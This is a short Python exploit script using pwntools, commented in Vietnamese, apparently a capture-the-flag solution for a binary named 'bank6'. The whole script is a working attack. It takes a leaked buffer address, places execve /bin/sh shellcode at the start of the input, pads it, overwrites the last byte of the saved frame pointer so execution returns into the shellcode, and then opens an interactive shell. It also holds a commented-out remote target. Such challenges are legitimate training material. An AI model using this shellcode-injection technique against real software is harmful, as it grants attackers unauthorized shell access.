from pwn import *

binary = context.binary = ELF('./bank6')

p = process('./bank6')
#p = remote('61.28.237.24', '30207')

p.recvuntil('Here is a gift: ')

shelladdr = int(p.recvline().strip(), 16) # lấy địa chỉ của biến name chính là địa chỉ của shellcode 

# shellcode execve để gọi bash shell
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x08\x40\x40\x40\xcd\x80"


# khoảng cách giữa địa chỉ biến name với địa chỉ ebp sau khi overwrite byte cuối
dis = (((shelladdr + 1036) >> 8) << 8) - shelladdr

# inject payload ngay đầu chuỗi nhập (địa chỉ biến name)
payload = shellcode

# padding từ cuối shellcode đến vị trí ebp+4 
payload += b'A'*(dis+4-len(payload))

# ghi vào ebp+4 địa chỉ của shellcode
payload += p32(shelladdr)

# padding đủ 1036 byte để overwrite byte cuối ebp để ebp+4 nằm trong khoảng 1036 byte input name
payload += b'A'*(0x40c-len(payload))





f = open('solve.txt', 'wb')

f.write(payload)
p.sendline(payload)

p.interactive()
